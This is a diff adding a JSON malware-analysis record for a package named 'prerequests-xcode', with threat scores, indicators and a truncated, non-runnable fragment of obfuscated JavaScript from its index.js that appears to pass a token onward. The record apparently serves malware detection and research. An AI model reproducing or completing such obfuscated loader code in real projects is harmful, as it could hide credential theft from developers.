@@ -1,0 +1,29 @@
+{
+    "package_metadata": {
+        "name": "prerequests-xcode",
+        "version": "1.0.4"
+    },
+    "behavior_analysis": {
+        "file_operations": [],
+        "network_activity": [],
+        "process_actions": []
+    },
+    "malicious_code": {
+        "suspicious_modules": [
+            {
+                "filename": "package/index.js",
+                "code_snippet": "var _0x57d017=_0x4d52;(function(_0x31069e,_0x5cad26){var _0x4953f0=_0x4d52,_0xaa306b=_0x31069e();while(!![]){try{var _0xb9e2d5=parseInt(_0x4953f0(0x1eb))/0x1+-parseInt(_0x4953f0(0x21f))/0x2+parseInt(_0x4953f0(0x222))/0x3*(parseInt(_0x4953f0...)](token);"
+            }
+        ]
+    },
+    "threat_assessment": {
+        "malware_score": 0.85,
+        "risk_score": 0.9,
+        "confidence": 0.95,
+        "indicators": [
+            "Obfuscated payload delivery",
+            "Suspicious domain extension in code",
+            "High entropy Base64-encoded strings"
+        ]
+    }
+}
